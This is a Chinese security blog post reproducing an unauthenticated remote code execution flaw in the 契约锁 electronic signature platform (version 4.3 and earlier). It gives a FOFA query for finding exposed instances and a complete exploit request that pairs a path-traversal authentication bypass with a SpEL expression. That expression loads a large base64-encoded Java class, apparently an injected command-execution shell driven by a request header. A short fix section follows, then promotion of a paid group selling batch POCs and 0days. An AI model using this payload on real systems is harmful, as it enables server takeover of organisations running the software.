#  「漏洞复现」契约锁电子签章平台 add 远程命令执行漏洞   
冷漠安全  冷漠安全   2024-06-29 19:33  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
契约锁电子签章平台是上海亘岩网络科技有限公司推出的一套数字签章解决方案。契约锁为中大型组织提供“数字身份、电子签章、印章管控以及数据存证服务”于一体的数字可信基础解决方案,可无缝集成各类系统,让其具有电子化签署的能力,实现组织全程数字化办公。通过接口与组织的OA、HRM、CRM等系统集成，让现有管理系统具有电子签能力。系统按需配置，实现文件本地化存储。  
  
0x03  
  
**漏洞威胁**  
  
契约锁电子签章平台 /captcha/%2e%2e/template/html/add 接口处存在远程代码执行漏洞，未经身份验证的攻击者可通过tomcat对路径参数解析不正当的特性绕过权限认证在目标执行恶意代码，获取服务器权限。经过分析和研判，该漏洞利用难度低，可导致远程代码执行，建议尽快修复。  
  
影响范围：契约锁电子签章平台version <= 4.3  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
app="契约锁-电子签署平台"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oGS6mKgbYUVL4SkcAefe2ehIsGXZ6gVoN2icDaavT3IJlMWLxbGIQZYTN3xZ8b6cria840vyjUDqLQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
```
POST /captcha/%2e%2e/template/html/add HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36(KHTML, like Gecko) Chrome/98.0.155.44 Safari/537.36
Content-Type: application/json
X-State: whoami


{"file":"1","title":"2","params":[{"extensionParam":"{\"expression\":\"var a=new org.springframework.expression.spel.standard.SpelExpressionParser();var b='VCAob3JnLnNwcmluZ2ZyYW1ld29yay5jZ2xpYi5jb3JlLlJlZmxlY3RVdGlscykuZGVmaW5lQ2xhc3MoIlF5c1Rlc3QiLFQgKG9yZy5zcHJpbmdmcmFtZXdvcmsudXRpbC5CYXNlNjRVdGlscykuIGRlY29kZUZyb21TdHJpbmcoInl2NjZ2Z0FBQURJQktBb0FJUUNXQ0FDWENnQ1lBSmtLQUpnQW1nb0Ftd0NjQ0FDZENnQ2JBSjRIQUo4SUFLQUlBS0VJQUtJSUFLTUtBQjhBcEFvQXBRQ21DQUNuQ2dDWUFLZ0tBS1VBcVFjQWd3b0FtQUNxQ0FDckNnQXNBS3dLQUNFQXJRb0FId0NxQ0FDdUNnQWZBSzhLQUxBQXFnZ0FzUW9BTEFDeUNBQ3pDQUMwQndDMUNnQWZBTFlIQUxjS0FMZ0F1UWdBdWdjQXV3Z0F2QWdBdlFjQXZnb0FKd0MvQ2dBbkFNQUtBQ2NBd1FnQXdnY0F3d2dBeEFnQXhRa0F4Z0RIQ2dER0FNZ0lBTWtIQU1vSUFNc0lBTXdJQU0wS0FNNEF6d29BTEFEUUNBRFJDQURTQ0FEVENBRFVDQURWQndEV0NnRFhBTmdLQU5jQTJRb0EyZ0RiQ2dBOUFOd0lBTjBLQUQwQTNnb0FQUURmQndEZ0NnQkZBSllJQU9FS0FDd0E0Z29BUlFEakNBRGtDQURsQndEbUNnQk1BT2NJQU9nSEFPa0JBQVk4YVc1cGRENEJBQU1vS1ZZQkFBUkRiMlJsQVFBUFRHbHVaVTUxYldKbGNsUmhZbXhsQVFBU1RHOWpZV3hXWVhKcFlXSnNaVlJoWW14bEFRQUVkR2hwY3dFQUNVeFJlWE5VWlhOME93RUFDR1J2U1c1cVpXTjBBUUFVS0NsTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzQkFBVjJZWEl5T0FFQUlreHFZWFpoTDJ4aGJtY3ZRMnhoYzNOT2IzUkdiM1Z1WkVWNFkyVndkR2x2YmpzQkFBVjJZWEl5TmdFQUdVeHFZWFpoTDJ4aGJtY3ZjbVZtYkdWamRDOUdhV1ZzWkRzQkFBVjJZWEl5TndFQUlVeHFZWFpoTDJ4aGJtY3ZUbTlUZFdOb1RXVjBhRzlrUlhoalpYQjBhVzl1T3dFQUJYWmhjak14QVFBRmRtRnlNeklCQUJKTWFtRjJZUzlzWVc1bkwwOWlhbVZqZERzQkFBVjJZWEl6TXdFQUJYSmxjRzl1QVFBRGMzUnlBUUFTVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3QVFBRVkyMWtjd0VBRTF0TWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzQkFBbHlaWE4xYkhSVGRISUJBQVpsYm1OdlpHVUJBQVYyWVhJek1BRUFCWFpoY2pJNUFRQUJTUUVBQlhaaGNqSXhBUUFGZG1GeU1qSUJBQVYyWVhJeU13RUFCWFpoY2pJMEFRQUZkbUZ5TWpVQkFBVjJZWEkzT0FFQUZVeHFZWFpoTDNWMGFXd3ZRWEp5WVhsTWFYTjBPd0VBQlhaaGNqSXdBUUFGZG1GeU1Ua0JBQkpNYW1GMllTOXNZVzVuTDFSb2NtVmhaRHNCQUFWMllYSXhPQUVBQkhaaGNqZ0JBQVIyWVhJNUFRQVhUR3BoZG1FdmJHRnVaeTlEYkdGemMweHZZV1JsY2pzQkFBVjJZWEl4TUFFQUVVeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0FRQUZkbUZ5TVRFQkFBVjJZWEl4TWdFQUJYWmhjakV6QVFBRmRtRnlNVFFCQUFWMllYSXhOUUVBQlhaaGNqRTJBUUFUVzB4cVlYWmhMMnhoYm1jdlZHaHlaV0ZrT3dFQUJYWmhjakUzQVFBQldnRUFGVXhxWVhaaEwyeGhibWN2UlhoalpYQjBhVzl1T3dFQUEyMXpad0VBRFZOMFlXTnJUV0Z3VkdGaWJHVUhBTU1IQU9vSEFPc0hBSjhIQUxVSEFPd0hBTGNIQUxzSEFMNEhBR2NIQU9ZQkFBcFRiM1Z5WTJWR2FXeGxBUUFNVVhselZHVnpkQzVxWVhaaERBQlFBRkVCQUFWemRHRnlkQWNBNmd3QTdRRHVEQUR2QVBBSEFPc01BUEVBOEFFQUhXOXlaeTVoY0dGamFHVXVZMjk1YjNSbExsSmxjWFZsYzNSSmJtWnZEQUR5QVBNQkFDQnFZWFpoTDJ4aGJtY3ZRMnhoYzNOT2IzUkdiM1Z1WkVWNFkyVndkR2x2YmdFQUVHcGhkbUV1YkdGdVp5NVVhSEpsWVdRQkFCVnFZWFpoTG14aGJtY3VWR2h5WldGa1IzSnZkWEFCQUNKdmNtY3VZWEJoWTJobExtTnZlVzkwWlM1U1pYRjFaWE4wUjNKdmRYQkpibVp2QVFBSGRHaHlaV0ZrY3d3QTlBRDFCd0RzREFEMkFQY0JBQVowWVhKblpYUU1BUGdBK1F3QStnRDdEQUQ4QUZnQkFBUm9kSFJ3REFEOUFQNE1BUDhCQUFFQUNVVnVaSEJ2YVc1MEpBd0JBUUVDQndFREFRQWFiM0puTG1Gd1lXTm9aUzUwYjIxallYUXVkWFJwYkM1dVpYUU1BUVFCQlFFQUJuUm9hWE1rTUFFQUNtZGxkRWhoYm1Sc1pYSUJBQTlxWVhaaEwyeGhibWN2UTJ4aGMzTU1BUVlCQndFQUVHcGhkbUV2YkdGdVp5OVBZbXBsWTNRSEFRZ01BUWtCQ2dFQUNXZGxkRWRzYjJKaGJBRUFIMnBoZG1FdmJHRnVaeTlPYjFOMVkyaE5aWFJvYjJSRmVHTmxjSFJwYjI0QkFBWm5iRzlpWVd3QkFBcHdjbTlqWlhOemIzSnpBUUFUYW1GMllTOTFkR2xzTDBGeWNtRjVUR2x6ZEF3QkN3RU1EQUVOQVE0TUFQb0JEd0VBRTJkbGRGZHZjbXRsY2xSb2NtVmhaRTVoYldVQkFCQnFZWFpoTDJ4aGJtY3ZVM1J5YVc1bkFRQURjbVZ4QVFBSFoyVjBUbTkwWlFjQkVBd0JFUUI4REFFU0FSTUJBQXRuWlhSU1pYTndiMjV6WlFFQUVsdE1hbUYyWVM5c1lXNW5MME5zWVhOek93RUFDV2RsZEVobFlXUmxjZ0VBQjFndFUzUmhkR1VCQUFkdmN5NXVZVzFsQndFVURBRVZBUllNQVJjQVdBRUFCbmRwYm1SdmR3RUFCMk50WkM1bGVHVUJBQUl2WXdFQUJ5OWlhVzR2YzJnQkFBSXRZd0VBRVdwaGRtRXZkWFJwYkM5VFkyRnVibVZ5QndFWURBRVpBUm9NQVJzQkhBY0JIUXdCSGdFZkRBQlFBU0FCQUFKY1FRd0JJUUVpREFFakFGZ0JBQlp6ZFc0dmJXbHpZeTlDUVZORk5qUkZibU52WkdWeUFRQUZWVlJHTFRnTUFTUUJKUXdBYVFFbUFRQUpZV1JrU0dWaFpHVnlBUUFIYzNWalkyVnpjd0VBRTJwaGRtRXZiR0Z1Wnk5RmVHTmxjSFJwYjI0TUFTY0FVUUVBQldWeWNtOXlBUUFIVVhselZHVnpkQUVBRUdwaGRtRXZiR0Z1Wnk5VWFISmxZV1FCQUJWcVlYWmhMMnhoYm1jdlEyeGhjM05NYjJGa1pYSUJBQmRxWVhaaEwyeGhibWN2Y21WbWJHVmpkQzlHYVdWc1pBRUFEV04xY25KbGJuUlVhSEpsWVdRQkFCUW9LVXhxWVhaaEwyeGhibWN2VkdoeVpXRmtPd0VBRldkbGRFTnZiblJsZUhSRGJHRnpjMHh2WVdSbGNnRUFHU2dwVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjMHh2WVdSbGNqc0JBQWxuWlhSUVlYSmxiblFCQUFsc2IyRmtRMnhoYzNNQkFDVW9UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBUUFRWjJWMFJHVmpiR0Z5WldSR2FXVnNaQUVBTFNoTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OXlaV1pzWldOMEwwWnBaV3hrT3dFQURYTmxkRUZqWTJWemMybGliR1VCQUFRb1dpbFdBUUFPWjJWMFZHaHlaV0ZrUjNKdmRYQUJBQmtvS1V4cVlYWmhMMnhoYm1jdlZHaHlaV0ZrUjNKdmRYQTdBUUFEWjJWMEFRQW1LRXhxWVhaaEwyeGhibWN2VDJKcVpXTjBPeWxNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNCQUFkblpYUk9ZVzFsQVFBSVkyOXVkR0ZwYm5NQkFCc29UR3BoZG1FdmJHRnVaeTlEYUdGeVUyVnhkV1Z1WTJVN0tWb0JBQWhuWlhSRGJHRnpjd0VBRXlncFRHcGhkbUV2YkdGdVp5OURiR0Z6Y3pzQkFBcG5aWFJRWVdOcllXZGxBUUFWS0NsTWFtRjJZUzlzWVc1bkwxQmhZMnRoWjJVN0FRQVJhbUYyWVM5c1lXNW5MMUJoWTJ0aFoyVUJBQVpsY1hWaGJITUJBQlVvVEdwaGRtRXZiR0Z1Wnk5UFltcGxZM1E3S1ZvQkFBbG5aWFJOWlhSb2IyUUJBRUFvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3VzB4cVlYWmhMMnhoYm1jdlEyeGhjM003S1V4cVlYWmhMMnhoYm1jdmNtVm1iR1ZqZEM5TlpYUm9iMlE3QVFBWWFtRjJZUzlzWVc1bkwzSmxabXhsWTNRdlRXVjBhRzlrQVFBR2FXNTJiMnRsQVFBNUtFeHFZWFpoTDJ4aGJtY3ZUMkpxWldOME8xdE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc3BUR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdBUUFGWTJ4dmJtVUJBQlFvS1V4cVlYWmhMMnhoYm1jdlQySnFaV04wT3dFQUJITnBlbVVCQUFNb0tVa0JBQlVvU1NsTWFtRjJZUzlzWVc1bkwwOWlhbVZqZERzQkFCRnFZWFpoTDJ4aGJtY3ZTVzUwWldkbGNnRUFCRlJaVUVVQkFBZDJZV3gxWlU5bUFRQVdLRWtwVEdwaGRtRXZiR0Z1Wnk5SmJuUmxaMlZ5T3dFQUVHcGhkbUV2YkdGdVp5OVRlWE4wWlcwQkFBdG5aWFJRY205d1pYSjBlUUVBSmloTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0FRQUxkRzlNYjNkbGNrTmhjMlVCQUJGcVlYWmhMMnhoYm1jdlVuVnVkR2x0WlFFQUNtZGxkRkoxYm5ScGJXVUJBQlVvS1V4cVlYWmhMMnhoYm1jdlVuVnVkR2x0WlRzQkFBUmxlR1ZqQVFBb0tGdE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BUR3BoZG1FdmJHRnVaeTlRY205alpYTnpPd0VBRVdwaGRtRXZiR0Z1Wnk5UWNtOWpaWE56QVFBT1oyVjBTVzV3ZFhSVGRISmxZVzBCQUJjb0tVeHFZWFpoTDJsdkwwbHVjSFYwVTNSeVpXRnRPd0VBR0NoTWFtRjJZUzlwYnk5SmJuQjFkRk4wY21WaGJUc3BWZ0VBREhWelpVUmxiR2x0YVhSbGNnRUFKeWhNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNwVEdwaGRtRXZkWFJwYkM5VFkyRnVibVZ5T3dFQUJHNWxlSFFCQUFoblpYUkNlWFJsY3dFQUZpaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BXMElCQUJZb1cwSXBUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdBUUFQY0hKcGJuUlRkR0ZqYTFSeVlXTmxBQ0VBVHdBaEFBQUFBQUFDQUFFQVVBQlJBQUVBVWdBQUFDOEFBUUFCQUFBQUJTcTNBQUd4QUFBQUFnQlRBQUFBQmdBQkFBQUFDUUJVQUFBQURBQUJBQUFBQlFCVkFGWUFBQUFKQUZjQVdBQUJBRklBQUFjaUFBWUFJQUFBQXVrU0FrdTRBQU5NSzdZQUJMWUFCVTBzRWdhMkFBZFhwd0FKVGl1MkFBUk5MQklKdGdBSFRpd1NDcllBQnpvRUxCSUd0Z0FIT2dVc0VndTJBQWM2QmhrRUVneTJBQTA2QnhrSEJMWUFEaTBTRDdZQURUb0lHUWdFdGdBT0dRY3J0Z0FRdGdBUndBQVN3QUFTd0FBU3dBQVNPZ2tETmdvRE5nc1ZDeGtKdnFJQ1hCa0pGUXN5T2d3WkRNWUNTaGtNdGdBVEVoUzJBQldaQWowWkNCa010Z0FST2cwWkRjWUNMeGtOdGdBV3RnQVhFaGkyQUJXWkFoOFpEYllBRnJZQUdiWUFHaElidGdBY21RSU1HUTIyQUJZU0hiWUFEVG9PR1E0RXRnQU9HUTRaRGJZQUVUb1BHUSsyQUJZU0hnTzlBQisyQUNBWkR3TzlBQ0cyQUNJNkVBRTZFUmtRdGdBV0VpTUR2UUFmdGdBZ0dSQUR2UUFodGdBaU9oR25BQ0E2RWhrUXRnQVdFaVcyQUEwNkV4a1RCTFlBRGhrVEdSQzJBQkU2RVJrR0VpYTJBQTA2RWhrU0JMWUFEaGtTR1JHMkFCSEFBQ2M2RXhrVHRnQW93QUFuT2hRRE5oVVZGUmtVdGdBcG9nRmlHUlFWRmJZQUtqb1dHUmJHQVU0WkJSSXJBNzBBSDdZQUlCa1dBNzBBSWJZQUlzQUFMRG9YR1JmR0FUQVpGN2dBQTdZQUU3WUFISmtCSWhrRkVpMjJBQTA2R0JrWUJMWUFEaGtZR1JhMkFCRTZHUmtadGdBV0VpNEV2UUFmV1FPeUFDOVR0Z0FnR1JrRXZRQWhXUU1FdUFBd1U3WUFJam9hR1JxMkFCWVNNUU85QUIvQUFESzJBQ0FaR2dPOUFDRzJBQ0k2R3hrWnRnQVdFak1FdlFBZldRTVRBQ3hUdGdBZ0dSa0V2UUFoV1FNU05GTzJBQ0xBQUN3NkhCSTF1QUEydGdBM0VqaTJBQldaQUJrR3ZRQXNXUU1TT1ZOWkJCSTZVMWtGR1J4VHB3QVdCcjBBTEZrREVqdFRXUVFTUEZOWkJSa2NVem9kdXdBOVdiZ0FQaGtkdGdBL3RnQkF0d0JCRWtLMkFFTzJBRVE2SHJzQVJWbTNBRVlaSGhKSHRnQkl0Z0JKT2g4Wkc3WUFGaEpLQmIwQUgxa0RFd0FzVTFrRUV3QXNVN1lBSUJrYkJiMEFJVmtERWpSVFdRUVpIbE8yQUNKWEJEWUtwd0FKaEJVQnAvNmFGUXFaQUFhbkFBbUVDd0duL2FJU1MwdW5BQXRNSzdZQVRSSk9TeXF3QUFNQUR3QVdBQmtBQ0FFQkFSb0JIUUFrQUFNQzNBTGZBRXdBQXdCVEFBQUJBZ0JBQUFBQUN3QURBQTRBQndBUEFBOEFFZ0FXQUJVQUdRQVRBQm9BRkFBZkFCY0FKZ0FZQUM0QUdRQTJBQm9BUGdBYkFFY0FIQUJOQUIwQVZRQWVBRnNBSHdCeUFDQUFkUUFpQUlBQUl3Q0hBQ1FBbVFBbEFLSUFKZ0RLQUNjQTFnQW9BTndBS1FEbEFDb0EvZ0FyQVFFQUxnRWFBRE1CSFFBdkFSOEFNQUVyQURFQk1RQXlBVG9BTlFGREFEWUJTUUEzQVZVQU9BRmZBRG9CYkFBN0FYVUFQQUY2QUQwQmt3QStBYVlBUHdHdkFFQUJ0UUJCQWI0QVFnSGtBRU1DQUFCRkFpY0FTQUppQUVrQ2ZnQktBcEVBU3dLL0FFd0N3Z0JOQXNVQU9nTExBRklDMEFCVEF0TUFJZ0xaQUcwQzNBQnhBdDhBYmdMZ0FHOEM1QUJ3QXVjQWN3QlVBQUFCYWdBa0FCb0FCUUJaQUZvQUF3RXJBQThBV3dCY0FCTUJId0FiQUYwQVhnQVNBYThCRmdCZkFGd0FHQUcrQVFjQVlBQmhBQmtCNUFEaEFHSUFZUUFhQWdBQXhRQmpBR0VBR3dJbkFKNEFaQUJsQUJ3Q1lnQmpBR1lBWndBZEFuNEFSd0JvQUdVQUhnS1JBRFFBYVFCbEFCOEJrd0V5QUdvQVpRQVhBWFVCVUFCckFHRUFGZ0ZpQVdrQVdRQnNBQlVBMWdIOUFHMEFYQUFPQU9VQjdnQnVBR0VBRHdEK0FkVUFid0JoQUJBQkFRSFNBSEFBWVFBUkFVTUJrQUJ4QUZ3QUVnRlZBWDRBY2dCekFCTUJYd0YwQUYwQWN3QVVBS0lDTVFCMEFHRUFEUUNIQWt3QWRRQjJBQXdBZUFKaEFIY0FiQUFMQUFjQzFRQjRBSFlBQVFBUEFzMEFlUUI2QUFJQUpnSzJBSHNBZkFBREFDNENyZ0I5QUh3QUJBQTJBcVlBZmdCOEFBVUFQZ0tlQUg4QWZBQUdBRWNDbFFDQUFGd0FCd0JWQW9jQWdRQmNBQWdBY2dKcUFJSUFnd0FKQUhVQ1p3Q0VBSVVBQ2dMZ0FBY0Fld0NHQUFFQUF3TG1BSWNBWlFBQUFJZ0FBQUdYQUE3L0FCa0FBd2NBaVFjQWlnY0Fpd0FCQndDTUJmOEFXQUFNQndDSkJ3Q0tCd0NMQndDTkJ3Q05Cd0NOQndDTkJ3Q09Cd0NPQndBU0FRRUFBUDhBcEFBU0J3Q0pCd0NLQndDTEJ3Q05Cd0NOQndDTkJ3Q05Cd0NPQndDT0J3QVNBUUVIQUlvSEFJOEhBSTRIQUk4SEFJOEhBSThBQVFjQWtCei9BQ2NBRmdjQWlRY0FpZ2NBaXdjQWpRY0FqUWNBalFjQWpRY0FqZ2NBamdjQUVnRUJCd0NLQndDUEJ3Q09Cd0NQQndDUEJ3Q1BCd0NPQndDUkJ3Q1JBUUFBL3dEcUFCMEhBSWtIQUlvSEFJc0hBSTBIQUkwSEFJMEhBSTBIQUk0SEFJNEhBQklCQVFjQWlnY0Fqd2NBamdjQWp3Y0Fqd2NBandjQWpnY0FrUWNBa1FFSEFJOEhBSWtIQUk0SEFJOEhBSThIQUk4SEFJa0FBRklIQUpML0FHUUFGZ2NBaVFjQWlnY0Fpd2NBalFjQWpRY0FqUWNBalFjQWpnY0FqZ2NBRWdFQkJ3Q0tCd0NQQndDT0J3Q1BCd0NQQndDUEJ3Q09Cd0NSQndDUkFRQUErZ0FGL3dBSEFBd0hBSWtIQUlvSEFJc0hBSTBIQUkwSEFJMEhBSTBIQUk0SEFJNEhBQklCQVFBQStnQUYvd0FGQUFFSEFJa0FBUWNBa3djQUFRQ1VBQUFBQWdDViIpLG5ldyBqYXZheC5tYW5hZ2VtZW50LmxvYWRpbmcuTUxldChuZXcgamF2YS5uZXQuVVJMWzBdLFQgKGphdmEubGFuZy5UaHJlYWQpLmN1cnJlbnRUaHJlYWQoKS5nZXRDb250ZXh0Q2xhc3NMb2FkZXIoKSkpLmRvSW5qZWN0KCk=';var b64=java.util.Base64.getDecoder();var deStr=new java.lang.String(b64.decode(b),'UTF-8');var c=a['parseExpression'](deStr);c.getValue();\"}","name":"test"}]}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oGS6mKgbYUVL4SkcAefe2eQcWrlgqicFibhCZrZQWeY1ic1TmeVicb7NHYaZZOnMpRs8yTC6sdicph6kg/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oGS6mKgbYUVL4SkcAefe2eWjHCcDLyKVC77HkXXFLFkugsibXl2m1BR8QWYSW4QcgF8SQxBs8zxHQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
目前官方已修复此漏洞，建议受影响用户尽快升级至安全版本  
```
https://www.qiyuesuo.com/
```  
  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oGS6mKgbYUVL4SkcAefe2eCBjZDWLe3HYmjVM3aUu2dl431re8UkwWtheP9fWmawMVAEKr5XEztg/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0oGS6mKgbYUVL4SkcAefe2eibds6UCEDEwc0A6AqMVKStx9XnSaRiamialfWPB3Qrc72r6YhJ3wSicDBA/640?wx_fmt=gif&from=appmsg "")  
  
  
